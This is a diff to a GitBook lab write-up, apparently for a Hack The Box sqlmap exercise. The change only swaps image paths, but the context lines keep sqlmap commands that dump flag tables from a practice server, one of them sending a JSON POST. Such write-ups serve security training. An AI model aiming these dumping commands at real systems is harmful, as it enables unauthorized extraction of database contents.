@@ -37,7 +37,7 @@ Sabiendo como se llama realizamos lo siguiente para ver lo que contiene en dicha
   -D testdb -T flag2 --dump
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 **What's the contents of table flag3? (Case #3)**
 
@@ -53,7 +53,7 @@ What's the contents of table flag4? (Case #4)
 sqlmap -u 'http://94.237.57.211:53268/case4.php' -H 'Content-Type: application/json' --data '{"id":1}' -T flag4 --dump --method POST
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### Attack Tuning
 
